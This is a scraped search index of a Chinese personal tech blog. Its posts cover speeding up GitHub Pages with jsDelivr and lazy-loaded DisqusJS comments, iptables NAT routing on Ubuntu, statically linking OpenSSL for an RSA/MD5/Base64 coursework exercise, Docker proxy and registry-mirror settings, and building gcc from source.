更新：为了更好的控制版本和决定是否使用 jsDelivr, 可以将这个地方独立出来放到配置文件里 _config.yml cdn: enabled: true url: https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2 用到的地方 \u003c!-- styles --\u003e \u003c% if (theme.cdn.enabled) { %\u003e \u003clink rel=\"stylesheet\" href=\"\u003c%= theme.cdn.url %\u003e/css/style.css\"\u003e \u003c% } else { %\u003e \u003c%- css('css/style') %\u003e \u003c% } %\u003e 其他的地方同样的方法 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:3:2","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#替换链接"},{"categories":["coding"],"content":"替换链接 大部分 hexo 主题并不会对使用到的 js\\css\\图片\\字体 套上 CDN，我们来手动替换 css 样式表 大部分 css 样式会在 head 标签里面引入，这里的 css 样式表会阻塞页面的渲染，导致打开慢的体验，所以需要特别注意 我将我使用的主题的 style.css \\ rtl.css \\ disquesjs.css 替换成 jsDelivr，明显提升了等待时间 还有一些其他地方的 css 引入 js 脚本 寻找并替换各种调用到的 js 脚本 main.js disqusjs.js 还有其他的一些地方，不一一列举了 字体 字体需要特别注意，通常情况下比较大，耗时比较长 我使用的主题使用的字体通过 all.min.css 引入，因为前面这个 css 样式已经通过 jsDelivr 导入，里面的字体使用的是相对链接，所以字体默认也是通过 jsDelivr 引入了 img 小图片 一般是 logo 等资源，根据主题自行替换 更新：为了更好的控制版本和决定是否使用 jsDelivr, 可以将这个地方独立出来放到配置文件里 _config.yml cdn: enabled: true url: https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2 用到的地方 \u003c% if (theme.cdn.enabled) { %\u003e \u003c% } else { %\u003e \u003c%- css('css/style') %\u003e \u003c% } %\u003e 其他的地方同样的方法 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:3:2","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#css-样式表"},{"categories":["coding"],"content":"替换链接 大部分 hexo 主题并不会对使用到的 js\\css\\图片\\字体 套上 CDN，我们来手动替换 css 样式表 大部分 css 样式会在 head 标签里面引入，这里的 css 样式表会阻塞页面的渲染，导致打开慢的体验，所以需要特别注意 我将我使用的主题的 style.css \\ rtl.css \\ disquesjs.css 替换成 jsDelivr，明显提升了等待时间 还有一些其他地方的 css 引入 js 脚本 寻找并替换各种调用到的 js 脚本 main.js disqusjs.js 还有其他的一些地方，不一一列举了 字体 字体需要特别注意，通常情况下比较大，耗时比较长 我使用的主题使用的字体通过 all.min.css 引入，因为前面这个 css 样式已经通过 jsDelivr 导入，里面的字体使用的是相对链接，所以字体默认也是通过 jsDelivr 引入了 img 小图片 一般是 logo 等资源，根据主题自行替换 更新：为了更好的控制版本和决定是否使用 jsDelivr, 可以将这个地方独立出来放到配置文件里 _config.yml cdn: enabled: true url: https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2 用到的地方 \u003c% if (theme.cdn.enabled) { %\u003e \u003c% } else { %\u003e \u003c%- css('css/style') %\u003e \u003c% } %\u003e 其他的地方同样的方法 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:3:2","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#js-脚本"},{"categories":["coding"],"content":"替换链接 大部分 hexo 主题并不会对使用到的 js\\css\\图片\\字体 套上 CDN，我们来手动替换 css 样式表 大部分 css 样式会在 head 标签里面引入，这里的 css 样式表会阻塞页面的渲染，导致打开慢的体验，所以需要特别注意 我将我使用的主题的 style.css \\ rtl.css \\ disquesjs.css 替换成 jsDelivr，明显提升了等待时间 还有一些其他地方的 css 引入 js 脚本 寻找并替换各种调用到的 js 脚本 main.js disqusjs.js 还有其他的一些地方，不一一列举了 字体 字体需要特别注意，通常情况下比较大，耗时比较长 我使用的主题使用的字体通过 all.min.css 引入，因为前面这个 css 样式已经通过 jsDelivr 导入，里面的字体使用的是相对链接，所以字体默认也是通过 jsDelivr 引入了 img 小图片 一般是 logo 等资源，根据主题自行替换 更新：为了更好的控制版本和决定是否使用 jsDelivr, 可以将这个地方独立出来放到配置文件里 _config.yml cdn: enabled: true url: https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2 用到的地方 \u003c% if (theme.cdn.enabled) { %\u003e \u003c% } else { %\u003e \u003c%- css('css/style') %\u003e \u003c% } %\u003e 其他的地方同样的方法 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:3:2","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#字体"},{"categories":["coding"],"content":"替换链接 大部分 hexo 主题并不会对使用到的 js\\css\\图片\\字体 套上 CDN，我们来手动替换 css 样式表 大部分 css 样式会在 head 标签里面引入，这里的 css 样式表会阻塞页面的渲染，导致打开慢的体验，所以需要特别注意 我将我使用的主题的 style.css \\ rtl.css \\ disquesjs.css 替换成 jsDelivr，明显提升了等待时间 还有一些其他地方的 css 引入 js 脚本 寻找并替换各种调用到的 js 脚本 main.js disqusjs.js 还有其他的一些地方，不一一列举了 字体 字体需要特别注意，通常情况下比较大，耗时比较长 我使用的主题使用的字体通过 all.min.css 引入，因为前面这个 css 样式已经通过 jsDelivr 导入，里面的字体使用的是相对链接，所以字体默认也是通过 jsDelivr 引入了 img 小图片 一般是 logo 等资源，根据主题自行替换 更新：为了更好的控制版本和决定是否使用 jsDelivr, 可以将这个地方独立出来放到配置文件里 _config.yml cdn: enabled: true url: https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2 用到的地方 \u003c% if (theme.cdn.enabled) { %\u003e \u003c% } else { %\u003e \u003c%- css('css/style') %\u003e \u003c% } %\u003e 其他的地方同样的方法 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:3:2","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#img-小图片"},{"categories":["coding"],"content":"加载时文字可见 无论怎样优化，字体加载的时间无法忽略，这段时间的网页文字显示为空，这给用户带来卡顿感 我们必须使字体加载时文字可见，这样才能弥补 github pages 的慢 具体方法是将各 @font-face 中 font-display 设置为 swap, 这样可以在字体未加载完时临时使用系统字体替代，加载完后重新渲染字体 每一个地方都需要改，自己搜索吧 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:4:0","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#加载时文字可见"},{"categories":["coding"],"content":"使用 DisqusJS 由于众所周知的原因，disqus 被墙了，国内访问不了，而大部分 hexo 网站都使用 disqus 作为评论系统，这导致网页会卡在评论区的加载上，虽然网页已经加载完了，但进度条还在进行，给用户带来慢的感觉。 并且，即使有的用户翻墙能够访问 Disqus，但 Disqus 本身非常笨重，各种 CSS/JS/Font/API 加起来请求不小于 2MB，当 Disqus 加载时，浏览器会在主线程中同步解析、渲染 Disqus，造成卡顿感。 在上网搜索之后，找到了一个替代方案，那就是苏卡卡大佬的 DisqusJS，大家可以根据教程对自己博客的主题进行修改 参考链接： https://blog.skk.moe/post/disqusjs/ https://disqusjs.skk.moe/ https://github.com/SukkaW/DisqusJS 对于使用的 Disqus API 反代，我自己测试发现苏卡卡大佬提供的速度不太行，不知道是什么原因，所以推荐自己进行搭建，我是用的是 zeit 进行搭建，感觉还不错 如果 disqusJS 默认样式不适合自己的主题，推荐 fork 原库进行修改，注意要使用 1.2.6，最新的 master 在懒加载上有点问题 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:5:0","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#使用-disqusjs"},{"categories":["coding"],"content":"使用懒加载 如果图片和评论区随着页面在一开始就加载，势必会拖累网页首次渲染和文字的迅速显示，这里最好的办法是使用懒加载技术 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:6:0","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#使用懒加载"},{"categories":["coding"],"content":"图片懒加载 对于图片，我使用了 hexo-lazyload-image 这个插件 安装 npm install hexo-lazyload-image --save 配置文件中添加 lazyload: enable: true onlypost: false loadingImg: https://cdn.jsdelivr.net/gh/zu1k/blog@0.0.1.2/images/loading.png 顺便给懒加载添加了 cdn 功能，可以替换成 cdn 链接来加速 npm install hexo-lazyload-image-cdn --save 配置文件中添加 lazyload: enable: true onlypost: false loadingImg: # eg ./images/loading.gif cdn: enabled: false url: https://cdn.com ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:6:1","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#图片懒加载"},{"categories":["coding"],"content":"评论懒加载 对于评论区，很多情况下用户根本不会划到页面底部（文章写得太烂没人看得下去）。 所以我这里对 disqus 的加载使用懒加载技术，参考 https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/ 我使用的是 disqusJS, 下面给出加载的 js 代码 \u003c!-- DisqusJS Comments --\u003e \u003c% if (theme.disqusjs.enabled \u0026\u0026 theme.disqusjs.shortname){ %\u003e \u003cscript crossorigin defer src=\"https://cdn.jsdelivr.net/gh/zu1k/DisqusJS@1.2.6.3/dist/disqus.js\" id=\"disqusjs-script\"\u003e\u003c/script\u003e \u003cscript\u003e document.getElementById(\"disqusjs-script\").addEventListener(\"load\",function() { setTimeout( function() { function t() { var dsqjs = new DisqusJS({ shortname: '\u003c%= theme.disqusjs.shortname %\u003e', siteName: '\u003c%= theme.disqusjs.siteName %\u003e', api: '\u003c%= theme.disqusjs.api %\u003e', apikey: '\u003c%= theme.disqusjs.apikey %\u003e', admin: '\u003c%= theme.disqusjs.admin %\u003e', adminLabel: '\u003c%= theme.disqusjs.adminLabel %\u003e' }); } var runningOnBrowser = typeof window !== \"undefined\"; var isBot = runningOnBrowser \u0026\u0026 !(\"onscroll\" in window) || typeof navigator !== \"undefined\" \u0026\u0026 /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent); var supportsIntersectionObserver = runningOnBrowser \u0026\u0026 \"IntersectionObserver\" in window; if (!isBot \u0026\u0026 supportsIntersectionObserver) { var disqus_observer = new IntersectionObserver(function(entries) { if (entries[0].isIntersecting) { t(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.getElementById('disqus_thread')); } else { t(); } }, 1); },!0 ); \u003c/script\u003e \u003c% } %\u003e ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:6:2","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#评论懒加载"},{"categories":["coding"],"content":"终极大招 如果经过上面的优化，你还对博客的加载速度不满意，那一定是 github pages 服务器在美国的原因，200+ms 的延迟导致首字节返回时间不短 其实支持通过 Github 仓库代码进行构建，部署为静态网站的平台不值 github pages 一家，我使用过的比较好的是 zeit.co ， 国内访问走的是台湾的 gcp 节点，延迟低速度快，推荐 具体使用方法非常简单，自行摸索吧 更新: 刚知道，如果更新太快的话，zeit 会暂停构建部署的 You are pushing commits at a very fast pace (across the whole organization). Due to that, we cannot deploy the commit e80751b. You can try again later or upgrade your plan. ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:7:0","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#终极大招"},{"categories":["coding"],"content":"辅助优化 使用谷歌提供的 Pagespeed Insights 工具分析网页加载并根据建议进行优化 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:8:0","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#辅助优化"},{"categories":["coding"],"content":"实验环境 使用 vmware 分别创建win7和ubuntu两个虚拟机 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/:1:0","series":null,"tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/#实验环境"},{"categories":["coding"],"content":"ubuntu 18.04 充当网关路由器 网卡1(WAN口)：桥接公网 网卡2(LAN口)：vmnet15 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/:1:1","series":null,"tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/#ubuntu-1804"},{"categories":["coding"],"content":"win7 充当内网客户机 网卡：vmnet15 vmnet15不使用vmware的配置，使用一个空的vmnet ","date":"2020-03-18","objectID":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/:1:2","series":null,"tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/#win7"},{"categories":["coding"],"content":"ubuntu 配置 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/:2:0","series":null,"tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/#ubuntu-配置"},{"categories":["coding"],"content":"开启ipv4 forward 修改 /etc/sysctl.conf 开启ipv4的forward功能，将下面的注释打开，如果没有手动添加。 sysctl -p 生效 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/:2:1","series":null,"tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/#开启ipv4-forward"},{"categories":["coding"],"content":"配置网卡信息 ip addr 查看所有网卡的名称和信息 ubuntu18.04使用netplan管理网络，修改其配置文件 sudo nano /etc/netplan/50-cloud-init.yaml 使用 netplan try 检查配置是否正确，如果正确自动应用生效 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/:2:2","series":null,"tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/#配置网卡信息"},{"categories":["coding"],"content":"配置iptables规则 //清空已有规则防止干扰 iptables -F //进、出、转发默认允许 iptables -P INPUT ACCEPT iptables -P FORWARD ACCEPT iptables -P OUTPUT ACCEPT //将从子网网段来的连接nat到eno33网卡(互联网)，ip改为外网ip iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -o eno33 -j SNAT --to-source 192.168.254.129 //添加伪装 iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -j MASQUERADE ","date":"2020-03-18","objectID":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/:2:3","series":null,"tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/#配置iptables规则"},{"categories":["coding"],"content":"win7 设置 修改网卡配置如图 win7即可通过ubuntu这个网关上网 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/:3:0","series":null,"tags":["iptables"],"title":"使用iptables将ubuntu配置为路由器","uri":"https://zu1k.com/posts/linux/ubuntu-iptables-nat/#win7-设置"},{"categories":["coding"],"content":"简介 目标平台： Windows 10 amd64 使用静态链接方式，原因：动态链接库太大了，包含很多本次实验不需要的函数 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:1:0","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#简介"},{"categories":["coding"],"content":"准备工作 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:2:0","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#准备工作"},{"categories":["coding"],"content":"下载openssl代码 git clone https://github.com/openssl/openssl.git 或者从官网 https://www.openssl.org/source/ 下载源代码 我使用的是openssl 1.1.1 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:2:1","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#下载openssl代码"},{"categories":["coding"],"content":"安装perl环境，这里使用的是ActivePerl https://www.activestate.com/products/perl/ ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:2:2","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#安装perl环境这里使用的是activeperl"},{"categories":["coding"],"content":"安装NASM汇编器 https://www.nasm.us/ ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:2:3","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#安装nasm汇编器"},{"categories":["coding"],"content":"配置环境变量 将刚刚安装的nasm和perl的bin目录加入PATH ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:2:4","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#配置环境变量"},{"categories":["coding"],"content":"编译 openssl 静态链接库 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:3:0","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#编译-openssl-静态链接库"},{"categories":["coding"],"content":"初始化环境 使用visual studio自带的命令提示工具初始化环境，因为需要使用nmake ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:3:1","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#初始化环境"},{"categories":["coding"],"content":"生成编译配置文件 cd进入openssl源码目录 执行 perl Configure VC-WIN64A no-asm no-shared --prefix=\"D:\\Project\\opensslwork\\openssl\\build\" --openssldir=\"D:\\Project\\opensslwork\\openssl\\build\\ssl\" ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:3:2","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#生成编译配置文件"},{"categories":["coding"],"content":"进行编译并测试和安装 nmake nmake test nmake install 此时已经有了我们需要的头文件和静态链接lib库 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:3:3","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#进行编译并测试和安装"},{"categories":["coding"],"content":"使用openssl的api进行编程 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:4:0","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#使用openssl的api进行编程"},{"categories":["coding"],"content":"visual studio项目配置 vs创建空项目，然后配置头文件和库文件的路径 项目右键-属性，配置选择所有配置，平台选择x64 VC++ 目录 配置里面的 包含目录 添加openssl的头文件目录, 我这里是 D:\\Project\\opensslwork\\openssl\\build\\include; 链接器 里面的 输入 的 附加依赖项 添加 静态库名，libcrypto.lib;libssl.lib; 注意：在使用openssl的静态链接库时，除了添加 libcrypto.lib;libssl.lib;，还需要添加系统的依赖库：crypt32.lib;WS2_32.lib;， 因为openssl在windows平台使用了这些库。 完整的： kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies);crypt32.lib;libcrypto.lib;libssl.lib;WS2_32.lib; ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:4:1","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#visual-studio项目配置"},{"categories":["coding"],"content":"添加头文件 因为需要md5,rsa,base64等操作，这里需要导入openssl四个相关的头文件 #include \u003copenssl/rsa.h\u003e #include \u003copenssl/pem.h\u003e #include \u003copenssl/md5.h\u003e #include \u003copenssl/bio.h\u003e ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:4:2","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#添加头文件"},{"categories":["coding"],"content":"使用MD5对字符串生成摘要 int md5_hash(const char *in, unsigned char *md) { unsigned char* data; const unsigned char* str; data = (unsigned char*)in; MD5(data, strlen(in), md); //调用openssl的md5方法 return 1; } ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:4:3","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#使用md5对字符串生成摘要"},{"categories":["coding"],"content":"生成rsa密钥对并以pem格式写入文件 RSA * gen_rsa() { int bits = 1024; RSA* rsa = RSA_new(); BIGNUM* e = BN_new(); BN_set_word(e, RSA_F4); int rc = RSA_generate_key_ex(rsa, bits, e, NULL); //openssl中生成rsa key的新方法 BN_free(e); if (rc != 1) return NULL; size_t pri_len; size_t pub_len; char* pri_key = NULL; char* pub_key = NULL; BIO* pubkey = BIO_new_file(\"public.pem\", \"w\"); BIO* prikey = BIO_new_file(\"private.pem\", \"w\"); PEM_write_bio_RSAPrivateKey(prikey, rsa, NULL, NULL, 0, NULL, NULL); //私钥写入文件 PEM_write_bio_RSAPublicKey(pubkey, rsa); //公钥写入文件 return rsa; } ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:4:4","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#生成rsa密钥对并以pem格式写入文件"},{"categories":["coding"],"content":"对数据进行base64编码，base64在BIO中有 int base64_encode(const unsigned char* buffer, size_t length, char** b64text) { BIO* bio, * b64; BUF_MEM* bufferPtr; b64 = BIO_new(BIO_f_base64()); bio = BIO_new(BIO_s_mem()); bio = BIO_push(b64, bio); BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL); BIO_write(bio, buffer, length); BIO_flush(bio); BIO_get_mem_ptr(bio, \u0026bufferPtr); BIO_set_close(bio, BIO_NOCLOSE); *b64text = (char*)malloc((bufferPtr-\u003elength + 1) * sizeof(char)); memcpy(*b64text, bufferPtr-\u003edata, bufferPtr-\u003elength); (*b64text)[bufferPtr-\u003elength] = '\\0'; BIO_free_all(bio); return 0; } ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:4:5","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#对数据进行base64编码base64在bio中有"},{"categories":["coding"],"content":"最后通过main函数读入字符串并将三个过程连起来 int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"usage: work.exe \\\"string to hash and sign\\\"\"); return 0; } char* str = argv[1]; printf(\"your str: %s\\n\", str); // first md5(str) unsigned char md[MD5_DIGEST_LENGTH]; md5_hash(str, md); // then gen rsa pkey and sign the md RSA* rsa = gen_rsa(); unsigned char* sig = new unsigned char; unsigned int siglen; RSA_sign(NID_sha1, md, MD5_DIGEST_LENGTH, sig, \u0026siglen, rsa); // final base64(sig) char* b64text; base64_encode(sig, (size_t)siglen, \u0026b64text); printf(\"%s\\n\", b64text); return 0; } 因为是课程作业，就没有对出现的错误情况进行处理，实际使用时需要考虑到 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:4:6","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#最后通过main函数读入字符串并将三个过程连起来"},{"categories":["coding"],"content":"运行 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:5:0","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#运行"},{"categories":["coding"],"content":"运行截图 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:5:1","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#运行截图"},{"categories":["coding"],"content":"生成的私钥文件 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:5:2","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#生成的私钥文件"},{"categories":["coding"],"content":"生成的公钥文件 ","date":"2020-03-18","objectID":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/:5:3","series":null,"tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://zu1k.com/posts/coding/openssl-first-try-rsa-md5-base64/#生成的公钥文件"},{"categories":["Docker"],"content":"为docker设置代理 环境是在centos下，如果没有新建下面这个文件夹 sudo mkdir -p /etc/systemd/system/docker.service.d 之后新建下面这个文件走http代理 sudo vim /etc/systemd/system/docker.service.d/http-proxy.conf 填入 [Service] Environment=\"HTTP_PROXY=http://192.168.88.10:7890/\" 编辑下面这个文件走https代理 vim /etc/systemd/system/docker.service.d/https-proxy.conf 修改为 [Service] Environment=\"HTTPS_PROXY=https://proxy.example.com:443/\" 之后你使用docker pull的时候就可以pull gcr.io上的镜像了 https://juejin.im/post/5cc7b53c51882525124126f1 https://docs.docker.com/config/daemon/systemd ","date":"2020-03-08","objectID":"https://zu1k.com/posts/coding/speedup-docker-pull/:1:0","series":null,"tags":["Docker"],"title":"加速docker pull","uri":"https://zu1k.com/posts/coding/speedup-docker-pull/#为docker设置代理"},{"categories":["Docker"],"content":"换国内源 创建或修改 /etc/docker/daemon.json sudo mkdir -p /etc/docker sudo tee /etc/docker/daemon.json \u003c\u003c-'EOF' { \"registry-mirrors\": [ \"https://u8rbddql.mirror.aliyuncs.com\", \"https://docker.mirrors.ustc.edu.cn\", \"https://mirror.ccs.tencentyun.com\", \"https://registry.docker-cn.com\" ] } EOF sudo systemctl daemon-reload sudo systemctl restart docker https://juejin.im/post/5cd2cf01f265da0374189441 ","date":"2020-03-08","objectID":"https://zu1k.com/posts/coding/speedup-docker-pull/:2:0","series":null,"tags":["Docker"],"title":"加速docker pull","uri":"https://zu1k.com/posts/coding/speedup-docker-pull/#换国内源"},{"categories":["coding"],"content":" 一直用gcc编译各种东西，第一次研究如何编译gcc 这就是一个鸡生蛋与蛋生鸡的问题 ","date":"2019-12-28","objectID":"https://zu1k.com/posts/linux/gcc-compile/:0:0","series":null,"tags":["gcc","compile"],"title":"编译gcc","uri":"https://zu1k.com/posts/linux/gcc-compile/#"},{"categories":["coding"],"content":"依赖 编译gcc需要gmp、mpfr和mpc，还需要预先有一个已经能用的gcc ","date":"2019-12-28","objectID":"https://zu1k.com/posts/linux/gcc-compile/:1:0","series":null,"tags":["gcc","compile"],"title":"编译gcc","uri":"https://zu1k.com/posts/linux/gcc-compile/#依赖"},{"categories":["coding"],"content":"首先安装gmp 从 http://ftp.gnu.org/gnu/gmp/ 下载一个符合要求的稳定版本的gmp的源码 这里我下载的是 http://ftp.gnu.org/gnu/gmp/gmp-5.0.1.tar.bz2 解压后从源码编译安装 tar jxf gmp-5.0.1.tar.bz2 cd gmp-5.0.1 sudo ./configure --prefix=/opt/gmp sudo make sudo make install ","date":"2019-12-28","objectID":"https://zu1k.com/posts/linux/gcc-compile/:1:1","series":null,"tags":["gcc","compile"],"title":"编译gcc","uri":"https://zu1k.com/posts/linux/gcc-compile/#首先安装gmp"},{"categories":["coding"],"content":"安装mpfr 从 http://ftp.gnu.org/gnu/mpfr/ 下载一个稳定版本 我选择的是 http://ftp.gnu.org/gnu/mpfr/mpfr-3.1.4.tar.bz2 tar jxf 